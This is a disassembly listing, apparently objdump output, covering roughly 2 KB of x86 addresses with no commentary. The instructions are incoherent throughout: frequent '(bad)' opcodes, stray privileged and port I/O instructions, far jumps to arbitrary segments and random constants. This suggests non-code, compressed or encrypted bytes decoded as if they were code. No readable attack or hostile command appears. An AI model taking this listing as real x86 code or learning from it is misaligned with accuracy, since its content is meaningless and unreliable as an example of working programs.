  41115f:	mov    bh,0x82
  411161:	hlt    
  411162:	jmp    0xce8c:0x4287cfc1
  411169:	cli    
  41116a:	sub    eax,ecx
  41116c:	ja     0x4111cd
  41116e:	mov    esi,0x1ac2ae17
  411173:	test   eax,edx
  411175:	push   edi
  411176:	dec    eax
  411177:	outs   dx,DWORD PTR ds:[esi]
  411178:	mov    bh,cl
  41117a:	adc    dh,BYTE PTR [edi-0x5e]
  41117d:	lea    edx,[eax-0x7a]
  411180:	inc    edi
  411181:	dec    esp
  411182:	or     ecx,DWORD PTR [esi]
  411184:	xor    bl,BYTE PTR [edx+0x66]
  411187:	idiv   BYTE PTR [ebx+0x1f180e43]
  41118d:	into   
  41118e:	cdq    
  41118f:	sahf   
  411190:	xchg   edx,eax
  411191:	mov    ch,0x8a
  411193:	and    eax,0xdc753cda
  411198:	call   0x1b76:0xa3232a67
  41119f:	mov    ah,0xbd
  4111a1:	mov    esp,0xa1470f2
  4111a6:	xchg   BYTE PTR [ecx],al
  4111a8:	jnp    0x4111af
  4111aa:	hlt    
  4111ab:	cld    
  4111ac:	lds    eax,FWORD PTR [ebx-0x1c1c44ed]
  4111b2:	adc    edi,eax
  4111b4:	and    DWORD PTR [esi+ebp*4-0x567c8822],ecx
  4111bb:	cld    
  4111bc:	push   esp
  4111bd:	arpl   WORD PTR [ecx],dx
  4111bf:	loope  0x4111a0
  4111c1:	xchg   esp,eax
  4111c2:	adc    esp,eax
  4111c4:	pop    ecx
  4111c5:	jmp    0xd4f:0x6b33b8c9
  4111cc:	scas   al,BYTE PTR es:[edi]
  4111cd:	test   eax,0x491e24e7
  4111d2:	(bad)  
  4111d3:	in     eax,0x90
  4111d5:	push   esi
  4111d6:	test   BYTE PTR [edx-0x41],bh
  4111d9:	or     edx,DWORD PTR [edx]
  4111db:	lahf   
  4111dc:	mov    cl,0x2e
  4111de:	jge    0x4111ee
  4111e0:	aaa    
  4111e1:	out    dx,eax
  4111e2:	cdq    
  4111e3:	fstp   TBYTE PTR [edi-0x5dd6d5eb]
  4111e9:	add    BYTE PTR [eax+0x6b],0xc0
  4111ed:	pop    ds
  4111ee:	sub    DWORD PTR [edx+edi*8-0x25],esi
  4111f2:	lahf   
  4111f3:	ds pop ebx
  4111f5:	mov    ds:0xf4cceab9,eax
  4111fa:	gs dec esi
  4111fc:	mov    WORD PTR [edx+0x19c9cd21],gs
  411202:	push   ebp
  411203:	xchg   ecx,eax
  411204:	xlat   BYTE PTR ds:[ebx]
  411205:	xchg   BYTE PTR [edi],dl
  411207:	call   0xe1116d7d
  41120c:	dec    ecx
  41120d:	cmp    al,0x71
  41120f:	idiv   DWORD PTR [eax]
  411211:	mov    edi,0xbaaada72
  411216:	adc    al,BYTE PTR [ebx+edx*1+0x62]
  41121a:	xor    eax,DWORD PTR [ecx]
  41121c:	mov    eax,0x85452c78
  411221:	mov    eax,0xe28da999
  411226:	inc    ecx
  411227:	std    
  411228:	retf   0xd253
  41122b:	out    0xad,al
  41122d:	loopne 0x41129a
  41122f:	scas   al,BYTE PTR es:[edi]
  411230:	loope  0x41123c
  411232:	adc    BYTE PTR [eax+ecx*1],0x7
  411236:	mov    ecx,0x6f18fa3e
  41123b:	push   esp
  41123c:	in     al,dx
  41123d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41123e:	sbb    al,0x61
  411240:	rcl    BYTE PTR [eax+0x3f9f9567],1
  411246:	xlat   BYTE PTR ds:[ebx]
  411247:	xor    BYTE PTR [ebx-0x7de7b499],ah
  41124d:	push   es
  41124e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41124f:	or     esi,DWORD PTR [edx*4+0x4a563330]
  411256:	mov    bl,dh
  411258:	mov    eax,0x6510c1
  41125d:	push   ebx
  41125e:	or     ebx,0xe5702015
  411264:	repz ja 0x41123a
  411267:	mov    eax,ds:0xf8916731
  41126c:	inc    esi
  41126d:	xchg   ecx,eax
  41126e:	mov    ecx,DWORD PTR [ebx+0x5d]
  411271:	push   edx
  411272:	cmp    eax,0x28b63f70
  411277:	cwde   
  411278:	scas   eax,DWORD PTR es:[edi]
  411279:	fwait
  41127a:	jl     0x4112d0
  41127c:	ja     0x41129e
  41127e:	in     al,0x2d
  411280:	xchg   BYTE PTR [ebp+0x631fa57b],ah
  411286:	call   0x3392:0xc471c96
  41128d:	(bad)  
  41128e:	push   esp
  41128f:	and    DWORD PTR [ebp+0x2],edx
  411292:	push   ecx
  411293:	adc    esi,DWORD PTR [esi]
  411295:	and    edi,DWORD PTR ds:0x7739f88c
  41129b:	ret    0x1ee6
  41129e:	xchg   edi,eax
  41129f:	dec    ebx
  4112a0:	in     eax,dx
  4112a1:	jmp    0x411251
  4112a3:	or     esp,DWORD PTR [edx]
  4112a5:	stc    
  4112a6:	cmp    ebx,DWORD PTR [esi+eiz*2-0x3]
  4112aa:	mov    BYTE PTR [ebp+ecx*4+0x3d28e365],bl
  4112b1:	iret   
  4112b2:	imul   esp,DWORD PTR [edi+eax*1],0x88304ce5
  4112b9:	stos   BYTE PTR es:[edi],al
  4112ba:	sbb    BYTE PTR [ebp+esi*8+0x1a],al
  4112be:	adc    ebp,ebx
  4112c0:	test   al,0xce
  4112c2:	sahf   
  4112c3:	in     al,0x72
  4112c5:	or     eax,0x3029a3b
  4112ca:	retf   0x22cb
  4112cd:	push   0x69
  4112cf:	mov    ebp,0x9c4e271d
  4112d4:	cmp    al,0x9f
  4112d7:	cmp    bh,BYTE PTR [edi+0x261f9dcd]
  4112dd:	adc    al,0x53
  4112df:	xchg   DWORD PTR [esi-0x12ab555e],edi
  4112e5:	js     0x411359
  4112e7:	push   0x7f
  4112e9:	pop    edx
  4112ea:	add    DWORD PTR [eax],0xf9b7a402
  4112f0:	jl     0x4112b3
  4112f2:	mov    esi,0x15d7817b
  4112f7:	fisubr DWORD PTR [esi+edx*8]
  4112fa:	mov    ds:0x14099843,al
  4112ff:	ret    0xb1ec
  411302:	mov    ah,BYTE PTR [ebx-0x48]
  411305:	test   DWORD PTR [esi],0x94d5f06c
  41130b:	cli    
  41130c:	dec    ebx
  41130d:	add    dh,BYTE PTR [ecx+0x16e99df]
  411313:	xor    al,0x54
  411315:	enter  0xb7b6,0x3c
  411319:	nop
  41131a:	mov    ds:0xe0d787d7,eax
  41131f:	(bad)  
  411320:	sub    al,BYTE PTR [ebx+0x413c0fb1]
  411326:	nop
  411327:	aaa    
  411328:	pop    edi
  411329:	out    dx,eax
  41132a:	sbb    al,0x6c
  41132c:	jl     0x4112dc
  41132e:	mov    edi,0xa6e6c2b6
  411333:	adc    dl,BYTE PTR [ecx]
  411335:	mov    esp,0x7d9e5437
  41133a:	cs jp  0x411368
  41133d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41133e:	jmp    0x1eb2:0x40a33f1b
  411345:	fidiv  DWORD PTR [esi-0x26]
  411348:	outs   dx,DWORD PTR ds:[esi]
  411349:	mov    ebx,0x1ec724ed
  41134e:	mov    ds:0x7f16fa8a,eax
  411353:	aad    0xe5
  411355:	push   esi
  411356:	ret    
  411357:	ret    
  411358:	pop    edi
  411359:	daa    
  41135a:	or     al,0x2c
  41135c:	xchg   ch,ah
  41135e:	mov    ebp,0x9f15801e
  411363:	jmp    0xf7df:0x317a14d3
  41136a:	pop    edi
  41136b:	inc    esp
  41136c:	and    BYTE PTR [ebp-0x7e],bh
  41136f:	(bad)  
  411370:	mov    al,0x22
  411372:	jb     0x411321
  411374:	std    
  411375:	inc    eax
  411376:	pop    ss
  411377:	and    BYTE PTR [eax+0x48f6c44f],al
  41137d:	cmp    BYTE PTR [ebp-0xc1d89d8],dl
  411383:	add    DWORD PTR [edx],ebp
  411385:	jmp    0x9ba8:0x70da0bff
  41138c:	sbb    DWORD PTR [esi+0x20830c73],esp
  411392:	inc    edx
  411393:	sbb    eax,0x7a07df94
  411398:	mov    eax,edi
  41139a:	mov    edx,0x1781d3ef
  41139f:	fstp   QWORD PTR [esi]
  4113a1:	test   esi,0x9754e6f3
  4113a7:	jmp    0x4b7d:0x2911ca4d
  4113ae:	sub    ebp,DWORD PTR [esi]
  4113b0:	mov    dh,0xdd
  4113b2:	push   0x1c
  4113b4:	inc    esi
  4113b5:	mov    ah,0x16
  4113b7:	dec    ebp
  4113b8:	shl    ebx,cl
  4113ba:	mov    ds:0xd74aef1f,eax
  4113bf:	mov    cl,0x93
  4113c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113c2:	pop    ds
  4113c3:	mov    esi,0xbb8ab766
  4113c8:	ja     0x4113d8
  4113ca:	and    eax,ecx
  4113cc:	mov    eax,0x2816f9bd
  4113d1:	retf   
  4113d2:	xchg   BYTE PTR [eax+0x718d9e4a],bl
  4113d8:	(bad)  
  4113d9:	cmovg  eax,DWORD PTR [ecx]
  4113dc:	mov    ebp,0x944fdc3
  4113e1:	or     bh,BYTE PTR [esi+0x1]
  4113e4:	xor    BYTE PTR [eax+0x2c],dl
  4113e7:	jnp    0x4113c4
  4113e9:	div    DWORD PTR [ebp-0x115ebc03]
  4113ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113f0:	(bad)  
  4113f1:	jmp    0x4113f2
  4113f3:	icebp  
  4113f4:	mov    esi,0xcee24b93
  4113f9:	xlat   BYTE PTR ds:[ebx]
  4113fa:	jb     0x41143f
  4113fc:	jae    0x411458
  4113fe:	or     DWORD PTR [edx],ebx
  411400:	nop
  411401:	test   BYTE PTR cs:[esi+0x7ca117bd],bh
  411408:	dec    ebx
  411409:	aad    0xd8
  41140b:	das    
  41140c:	pop    esp
  41140d:	call   0xab35:0xa76fb5a2
  411414:	push   edi
  411415:	jb     0x411435
  411417:	scas   al,BYTE PTR es:[edi]
  411418:	adc    esi,edx
  41141a:	bnd lock ret 0x23fe
  41141f:	mov    dl,0x20
  411421:	sbb    al,0x57
  411423:	aam    0xd5
  411425:	or     DWORD PTR [edx],ebp
  411427:	iret   
  411428:	loopne 0x411445
  41142a:	push   ss
  41142b:	outs   dx,DWORD PTR ds:[esi]
  41142c:	cmp    DWORD PTR [esi],esi
  41142e:	nop
  41142f:	mov    ch,0x8
  411431:	jbe    0x411449
  411433:	int3   
  411434:	pop    ebp
  411435:	add    al,0xc6
  411437:	mov    esp,0xba209acf
  41143c:	pop    edi
  41143d:	push   esp
  41143e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41143f:	dec    edx
  411440:	inc    edi
  411441:	fsub   DWORD PTR [ecx+ecx*8+0x3f]
  411445:	mov    cl,0xa7
  411447:	clc    
  411448:	jnp    0x41148a
  41144a:	mov    bl,0x26
  41144c:	imul   edi,DWORD PTR [esi-0x1ce1f412],0x6e25f881
  411456:	inc    esp
  411457:	(bad)  
  411458:	hlt    
  411459:	push   ecx
  41145a:	mul    BYTE PTR [eax+0x50]
  41145d:	ret    0xb705
  411460:	pop    ss
  411461:	cmp    DWORD PTR [ecx+edi*4],0xd1576a9f
  411468:	cmp    eax,0x5e1319b6
  41146d:	ret    
  41146e:	fidivr WORD PTR [edi-0x3f0813cc]
  411474:	push   0xb0c93aed
  411479:	xor    ah,BYTE PTR [eax-0x7]
  41147c:	retf   0x8c0
  41147f:	pusha  
  411480:	push   ds
  411481:	and    eax,0x9847a4ce
  411486:	and    al,0xd0
  411488:	pop    ebp
  411489:	out    0xf5,eax
  41148b:	add    al,0xe5
  41148d:	or     BYTE PTR [edi-0x16a47058],bl
  411493:	dec    esp
  411494:	pop    edx
  411495:	add    esi,DWORD PTR [ebp+0x75fef52c]
  41149b:	xor    al,0x26
  41149d:	add    eax,0xa52610e6
  4114a2:	add    DWORD PTR [edx-0x4d],esp
  4114a5:	add    eax,0xbfe17662
  4114aa:	jp     0x4114c0
  4114ac:	rol    BYTE PTR [edi],0xd2
  4114af:	inc    ebx
  4114b1:	pop    edi
  4114b2:	das    
  4114b3:	out    dx,eax
  4114b4:	adc    eax,0x57b63af3
  4114b9:	bound  ebx,QWORD PTR [esi+0x518b5bd0]
  4114bf:	adc    DWORD PTR [ebp-0x5d043b47],0xffffff98
  4114c6:	mov    ebx,0xbc2ba81
  4114cb:	cmp    DWORD PTR [ebp+0xa],eax
  4114ce:	xor    al,0xa5
  4114d0:	in     al,0xe3
  4114d2:	mov    cl,0xfb
  4114d4:	sbb    DWORD PTR [ebp+eax*2+0x6441cdd4],edx
  4114db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114dc:	ins    DWORD PTR es:[edi],dx
  4114dd:	pushf  
  4114de:	add    DWORD PTR [ebx-0x6f],0x6451fcc9
  4114e5:	aas    
  4114e6:	js     0x41151d
  4114e8:	test   BYTE PTR [edi],0x76
  4114eb:	xchg   esp,eax
  4114ec:	bound  esi,QWORD PTR [edx+0x27e0828f]
  4114f2:	(bad)  
  4114f3:	repnz push esi
  4114f5:	and    eax,0x474d0356
  4114fa:	int3   
  4114fb:	mov    eax,0x940073bb
  411500:	xchg   esi,eax
  411501:	add    BYTE PTR [edi+0x6242c060],bl
  411507:	test   DWORD PTR [edi+0x7c7e64a0],eax
  41150d:	push   ds
  41150e:	or     ah,BYTE PTR [ebp-0x3e7b5234]
  411514:	inc    ebx
  411515:	inc    esp
  411516:	xchg   edi,eax
  411517:	(bad)  
  411518:	rcl    BYTE PTR [edi+ecx*2-0x28],1
  41151c:	sahf   
  41151d:	add    eax,0x90493398
  411522:	mov    BYTE PTR [ecx+edi*1-0x40152490],ch
  411529:	sar    DWORD PTR [ebx+0x155d1881],0x36
  411530:	test   edx,edi
  411532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411533:	jmp    0xbac9:0x4dc4291
  41153a:	dec    ebp
  41153b:	out    0xa3,al
  41153d:	or     BYTE PTR [ebx],0xa8
  411540:	retf   0xc565
  411543:	adc    eax,0x484837bf
  411548:	ins    BYTE PTR es:[edi],dx
  411549:	pop    ecx
  41154a:	cdq    
  41154b:	mul    dl
  41154d:	(bad)  
  41154e:	jns    0x411541
  411550:	ds das 
  411552:	(bad)  
  411553:	sbb    ebp,DWORD PTR [ecx-0x5bd454d]
  411559:	and    esp,0x1c
  41155c:	push   cs
  41155d:	out    dx,eax
  41155e:	cmp    ch,ch
  411560:	cmp    dl,bh
  411562:	test   BYTE PTR ds:0xcf727d22,bh
  411568:	mov    DWORD PTR [edi+0x13c102c8],0xf46c6b51
  411572:	dec    eax
  411573:	in     eax,dx
  411574:	sub    al,0x57
  411576:	pop    ss
  411577:	mov    dl,0x66
  411579:	add    edi,DWORD PTR [ecx+edi*2-0x9713040]
  411580:	lods   al,BYTE PTR ds:[esi]
  411581:	sahf   
  411582:	or     DWORD PTR [edx+0x745ee08f],edi
  411588:	(bad)  
  411589:	xchg   ebx,eax
  41158a:	aam    0xb7
  41158c:	sub    DWORD PTR [eax+0x1d4321eb],0x45
  411593:	sti    
  411594:	pusha  
  411595:	sbb    DWORD PTR [ebp+0x56],ebx
  411598:	test   eax,0x6bb85587
  41159d:	sub    dh,BYTE PTR [ebx+esi*4]
  4115a0:	push   ds
  4115a1:	fsubrp st(2),st
  4115a3:	cli    
  4115a4:	adc    eax,0xe7b4204a
  4115a9:	in     eax,dx
  4115aa:	pop    es
  4115ab:	sbb    DWORD PTR [ecx],eax
  4115ad:	call   0xa1a62df9
  4115b2:	inc    edx
  4115b3:	inc    ebx
  4115b4:	das    
  4115b5:	push   ecx
  4115b6:	mov    al,ds:0x63580561
  4115bb:	xor    esi,DWORD PTR [ecx+0x3bd80eb4]
  4115c1:	in     eax,0xf8
  4115c3:	icebp  
  4115c4:	jns    0x4115d9
  4115c6:	pusha  
  4115c7:	jae    0x411580
  4115c9:	ror    DWORD PTR cs:[ebp-0x521697a6],cl
  4115d0:	pushf  
  4115d1:	jns    0x4115c2
  4115d3:	jae    0x411581
  4115d5:	imul   ecx,DWORD PTR [eax],0xffffff86
  4115d8:	nop
  4115d9:	stos   BYTE PTR es:[edi],al
  4115da:	repnz adc DWORD PTR [edx+esi*1-0x16],ebx
  4115df:	sbb    DWORD PTR [eax+0x56],ebx
  4115e2:	add    eax,0x8520480f
  4115e7:	sub    eax,0xfb9dec9b
  4115ec:	xchg   ebp,eax
  4115ed:	cmp    al,0x72
  4115ef:	idiv   ecx
  4115f1:	repz pop edi
  4115f3:	in     eax,dx
  4115f4:	push   cs
  4115f5:	clc    
  4115f6:	adc    eax,0xdd154011
  4115fc:	test   eax,0x182721e5
  411601:	mov    dh,0xad
  411603:	aas    
  411604:	icebp  
  411605:	std    
  411606:	popf   
  411607:	adc    BYTE PTR [ebp+ebx*8-0x1f],dl
  41160b:	pop    eax
  41160c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41160d:	add    BYTE PTR [edi+ebx*1],dh
  411610:	pusha  
  411611:	test   BYTE PTR [esi+edx*8-0xf009858],ah
  411618:	mov    ecx,0x852d6a5c
  41161d:	(bad)  
  41161e:	ds out 0xde,eax
  411621:	cmp    ecx,DWORD PTR [ebx]
  411623:	pop    esp
  411624:	inc    ebp
  411625:	neg    DWORD PTR [eax-0x1c]
  411628:	pop    eax
  411629:	jo     0x4115fb
  41162b:	outs   dx,BYTE PTR ds:[esi]
  41162c:	sub    bh,BYTE PTR [esi+ebp*4]
  41162f:	push   edi
  411630:	add    al,0x95
  411632:	in     eax,0x75
  411634:	add    DWORD PTR [ecx],eax
  411636:	jmp    0x58c6b875
  41163b:	test   eax,0x1c6b6f59
  411640:	ret    
  411641:	call   0x962b:0x507cdcfb
  411648:	inc    ecx
  411649:	and    al,0x21
  41164b:	ins    BYTE PTR es:[edi],dx
  41164c:	inc    ebp
  41164d:	and    eax,0x5babefc0
  411652:	jae    0x4115e6
  411654:	mov    ch,0x5f
  411656:	out    0x96,eax
  411658:	mov    al,0xb5
  41165a:	fxch   st(4)
  41165c:	inc    edx
  41165d:	push   0xe7c130f4
  411662:	adc    al,0x1f
  411664:	xor    esp,esi
  411666:	mov    ?,esi
  411668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411669:	cmp    dl,BYTE PTR [eax+0xf47d459]
  41166f:	hlt    
  411670:	push   edi
  411671:	dec    edx
  411672:	stos   BYTE PTR es:[edi],al
  411673:	xchg   edx,eax
  411674:	jecxz  0x41162f
  411676:	lea    edx,[ebp+0x14]
  411679:	sbb    eax,0x1d9cc65b
  41167e:	mov    dl,0xd4
  411680:	ret    
  411681:	gs (bad) 
  411683:	jecxz  0x411672
  411685:	daa    
  411686:	(bad)  
  411687:	lods   eax,DWORD PTR ds:[esi]
  411688:	and    esp,DWORD PTR [ecx]
  41168a:	lock outs dx,DWORD PTR ds:[esi]
  41168c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41168d:	fnstsw WORD PTR [edx]
  41168f:	xchg   ecx,eax
  411690:	fwait
  411691:	sbb    eax,0x5ad0ba5c
  411696:	pop    esi
  411697:	popf   
  411698:	jge    0x411698
  41169a:	cld    
  41169b:	out    dx,eax
  41169c:	pop    edx
  41169d:	and    eax,0x25cdf80e
  4116a2:	test   edi,ecx
  4116a4:	xor    dh,BYTE PTR [eax]
  4116a6:	cmp    ch,BYTE PTR [ebx]
  4116a8:	call   0xcdab94e8
  4116ad:	inc    esi
  4116ae:	(bad)  
  4116b0:	sub    esi,0xdf13fcc9
  4116b6:	jg     0x4116ee
  4116b8:	lahf   
  4116b9:	sub    al,0xcf
  4116bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116bc:	mov    bl,0x99
  4116be:	arpl   ax,sp
  4116c0:	cmp    BYTE PTR [edi+ebp*2],dh
  4116c3:	cmp    al,0xb2
  4116c5:	jg     0x41167a
  4116c7:	cmp    ebx,edi
  4116c9:	test   al,0xf9
  4116cb:	(bad)  
  4116cc:	push   ss
  4116cd:	ins    DWORD PTR es:[edi],dx
  4116ce:	sbb    DWORD PTR [ebx-0x36],eax
  4116d1:	int    0x8b
  4116d3:	xor    al,0x52
  4116d5:	frstor [edx-0x6b77b5f4]
  4116db:	add    al,0x2b
  4116dd:	outs   dx,BYTE PTR ds:[esi]
  4116de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116df:	retf   
  4116e0:	dec    ecx
  4116e1:	retf   0x8dc4
  4116e4:	hlt    
  4116e5:	push   0xd3af8c6b
  4116ea:	cmp    al,0xd6
  4116ec:	call   0x8f17a062
  4116f1:	mov    edx,0xb7dd6c62
  4116f6:	xchg   ebx,eax
  4116f7:	push   0xbf3b5237
  4116fc:	mov    dl,0x5e
  4116fe:	jmp    0xdb116102
  411703:	aaa    
  411704:	sub    ebp,ecx
  411706:	sbb    eax,0xc547db78
  41170b:	mov    edi,0x65055c70
  411710:	rol    eax,cl
  411712:	xchg   esp,eax
  411713:	pop    ecx
  411714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411715:	cmp    DWORD PTR [ebx-0x32],ecx
  411718:	test   DWORD PTR [ebx],ecx
  41171a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41171b:	int3   
  41171c:	cli    
  41171d:	popa   
  41171e:	aad    0x6f
  411720:	rol    DWORD PTR [edx-0x6b8fc73f],1
  411726:	(bad)  [eax]
  411728:	or     ebx,ebp
  41172a:	mov    gs,WORD PTR [eax]
  41172c:	out    0xd1,eax
  41172e:	adc    BYTE PTR [esi-0x6c6e887c],dh
  411734:	(bad)  
  411735:	mov    bl,BYTE PTR [ecx]
  411737:	or     DWORD PTR [edx+0x7b27f346],esp
  41173d:	jno    0x411780
  41173f:	cld    
  411740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411741:	(bad)
  411744:	push   eax
  411745:	not    DWORD PTR gs:[ebp-0x5b]
  411749:	ret    0x868f
  41174c:	sbb    bl,BYTE PTR [ebp+0x7f]
  41174f:	in     al,dx
  411750:	hlt    
  411751:	mov    ah,0xc0
  411753:	xor    esp,esp
  411755:	add    bl,dl
  411757:	mov    eax,0xa60809bd
  41175c:	repz addr16 push es
  41175f:	mov    edx,0x12b00462
  411764:	sar    dl,cl
  411766:	sub    BYTE PTR [edx+0x1fa2d8ef],dh
  41176c:	rcl    BYTE PTR [ebp-0x3964c6cc],0xf5
  411773:	bound  ebx,QWORD PTR [edi-0x25]
  411776:	mov    al,ds:0x7b4e8613
  41177b:	out    dx,eax
  41177c:	bound  esp,QWORD PTR [edx+0x6f]
  41177f:	not    BYTE PTR [eax]
  411781:	push   edx
  411782:	jge    0x411792
  411784:	pop    ecx
  411785:	and    ebx,DWORD PTR [ecx-0x6ce299c4]
  41178b:	push   esp
  41178c:	mov    ebp,0x2447d094
  411791:	sub    al,BYTE PTR [eax-0x1f]
  411794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411795:	es push esp
  411797:	mov    ah,BYTE PTR [esi+0x78]
  41179a:	pop    ss
  41179b:	xlat   BYTE PTR ds:[ebx]
  41179c:	xchg   ebx,eax
  41179d:	test   al,0x56
  41179f:	mov    ah,BYTE PTR ds:[ecx+0x64b27760]
  4117a6:	xchg   BYTE PTR [ebp-0x7d],bl
  4117a9:	and    BYTE PTR [edx+0x70faa8a0],ch
  4117af:	in     al,dx
  4117b0:	aaa    
  4117b1:	adc    al,al
  4117b3:	adc    bh,BYTE PTR [esi+0x6fe29b5e]
  4117b9:	mov    BYTE PTR [esp+edi*8+0x7f074290],ch
  4117c0:	push   esi
  4117c1:	lods   al,BYTE PTR ds:[esi]
  4117c2:	mov    eax,ds:0xfb7ef7ba
  4117c7:	xchg   ebp,ecx
  4117c9:	mov    ebx,0xba8bcf97
  4117ce:	lea    ecx,[edi]
  4117d0:	pop    ecx
  4117d1:	and    bh,dh
  4117d3:	leave  
  4117d4:	das    
  4117d5:	push   esp
  4117d6:	shl    DWORD PTR [eax-0x7c36618],1
  4117dc:	cld    
  4117dd:	adc    DWORD PTR [esi+0x31],edx
  4117e0:	push   eax
  4117e1:	popa   
  4117e2:	das    
  4117e3:	inc    esi
  4117e4:	jmp    0x4117df
  4117e6:	stos   BYTE PTR es:[edi],al
  4117e7:	add    eax,0xc96d0c47
  4117ec:	push   ss
  4117ed:	test   al,0x5
  4117ef:	fidiv  WORD PTR [ebp+0x4d]
  4117f2:	stos   DWORD PTR es:[edi],eax
  4117f3:	std    
  4117f4:	sti    
  4117f5:	mov    dh,0x41
  4117f7:	in     eax,0x29
  4117f9:	xor    DWORD PTR [eax+ebx*8],edx
  4117fc:	jae    0x41186c
  4117fe:	cdq    
  4117ff:	call   FWORD PTR [eax]
  411801:	push   ecx
  411802:	arpl   WORD PTR [edx-0x7121288b],bp
  411808:	inc    edx
  411809:	cdq    
  41180a:	jg     0x41179a
  41180c:	js     0x41186f
  41180e:	aas    
  41180f:	jb     0x41179f
  411811:	repz sbb BYTE PTR [edi],0x8c
  411815:	test   eax,0xf6a30be7
  41181a:	ficomp WORD PTR [edx-0x46]
  41181d:	iret   
  41181e:	jnp    0x411841
  411820:	cwde   
  411821:	retf   
  411822:	aad    0xa
  411824:	js     0x41180e
  411826:	mov    bh,0xc7
  411828:	lods   al,BYTE PTR ds:[esi]
  411829:	retf   0x546a
  41182c:	or     al,0x4b
  41182e:	mov    bh,0x48
  411830:	pop    edx
  411831:	or     al,0x8d
  411833:	nop
  411834:	jecxz  0x411856
  411836:	jno    0x41181c
  411838:	in     al,0xa2
  41183a:	shl    ebx,cl
  41183c:	adc    al,0xb2
  41183e:	(bad)  
  41183f:	in     eax,0x49
  411841:	sub    DWORD PTR [ecx-0x1fa3d0f8],ecx
  411847:	jl     0x41189f
  411849:	imul   ebx,edi,0xabff385a
  41184f:	inc    edx
  411850:	pop    ebx
  411851:	icebp  
  411852:	loope  0x4118c6
  411854:	push   edi
  411855:	sahf   
  411856:	add    bh,dl
  411858:	stc    
  411859:	push   0xffffffc5
  41185b:	out    dx,al
  41185c:	imul   DWORD PTR [edi]
  41185e:	xchg   esp,eax
  41185f:	cwde   
  411860:	mov    dl,0x49
  411862:	retf   0x53ae
  411865:	pop    eax
  411866:	sbb    BYTE PTR [edi-0x4f8e0bdc],bl
  41186c:	daa    
  41186d:	imul   esi,DWORD PTR [edx],0x9bd48947
  411873:	lds    esp,FWORD PTR [eax]
  411875:	fisub  WORD PTR [edx-0x60]
  411878:	or     esi,DWORD PTR [eax+0x5f]
  41187b:	mov    al,ds:0x96e45eca
  411880:	aas    
  411881:	out    dx,al
  411882:	sbb    eax,0x568a8683
  411887:	pop    edx
  411888:	loopne 0x4118b8
  41188a:	pop    ebx
  41188b:	push   ebp
  41188c:	xchg   edi,eax
  41188d:	inc    edi
  41188e:	inc    edx
  41188f:	cli    
  411890:	aam    0xf7
  411892:	jns    0x4118c2
  411894:	out    0xc5,eax
  411896:	cmp    bl,ch
  411898:	jb     0x41184b
  41189a:	mov    BYTE PTR [eax+0x588168a4],cl
  4118a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118a1:	xchg   ah,cl
  4118a3:	pop    ss
  4118a4:	sub    DWORD PTR [eax+0x1704d41d],esi
  4118aa:	sub    ecx,esi
  4118ac:	pop    eax
  4118ad:	cmp    DWORD PTR [esi-0x11],esi
  4118b0:	mov    ch,0x39
  4118b2:	popa   
  4118b3:	mov    al,0xf7
  4118b5:	sub    ch,ah
  4118b7:	pushf  
  4118b8:	lea    esp,[edi+0x44]
  4118bb:	mov    al,0xdd
  4118bd:	add    dl,dl
  4118bf:	pop    edx
  4118c0:	mov    edi,0x55a5787e
  4118c5:	nop
  4118c6:	fild   WORD PTR [ebx-0x7a]
  4118c9:	fild   DWORD PTR [ecx-0x5a793042]
  4118cf:	push   cs
  4118d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118d1:	sbb    DWORD PTR [ecx+0x5c10187e],0x58
  4118d8:	dec    esi
  4118d9:	xor    BYTE PTR [esi+0x3063e6f4],bh
  4118df:	mov    bh,0xa7
  4118e1:	mov    eax,ds:0xea1c1a33
  4118e6:	lahf   
  4118e7:	cwde   
  4118e8:	jnp    0x411909
  4118ea:	or     DWORD PTR [edi+0x1bdf2c65],edx
  4118f0:	push   esp
  4118f1:	add    dh,bh
  4118f3:	in     eax,0x88
  4118f5:	gs in  eax,dx
  4118f7:	arpl   si,ax
  4118f9:	stos   DWORD PTR es:[edi],eax
  4118fa:	sbb    eax,0xf4bd1506
  4118ff:	sub    BYTE PTR [ebp-0x54],dh
  411902:	enter  0x20d1,0xa4
  411906:	dec    edi
  411907:	test   eax,0xdc1afe1
  41190c:	data16 imul BYTE PTR [ebx+esi*4+0x63]
  411911:	je     0x4118b9
  411913:	leave  
  411914:	out    dx,al
  411915:	inc    edi
  411916:	jmp    0xf76c:0xd7bc73c3
  41191d:	pop    ds
  41191e:	mov    ah,0x46
  411920:	sub    al,0x8c
  411922:	pop    ecx
  411923:	jge    0x411935
  411925:	call   0x9ddecd78
  41192a:	aaa    
  41192b:	loop   0x4118f9
  41192d:	hlt    
  41192e:	jbe    0x4118ed
  411930:	rcr    DWORD PTR [esi],cl
  411932:	adc    eax,esi
  411934:	xchg   ch,ch
  411936:	cmp    bh,bl
  411938:	ret    
  411939:	outs   dx,BYTE PTR ds:[esi]
  41193a:	sbb    al,0x16
  41193c:	sub    edi,0xffffff82
  41193f:	and    al,0xcc
  411941:	mov    al,ds:0xc2786176
  411946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411947:	sbb    dh,BYTE PTR [eax-0x62]
  41194a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41194b:	add    esp,DWORD PTR [esi-0x11a3bf48]
  411951:	jo     0x411926
  411953:	mov    ecx,0x5e1643bf
  411958:	mov    al,0x54
  41195a:	push   cs
  41195b:	loop   0x41194b
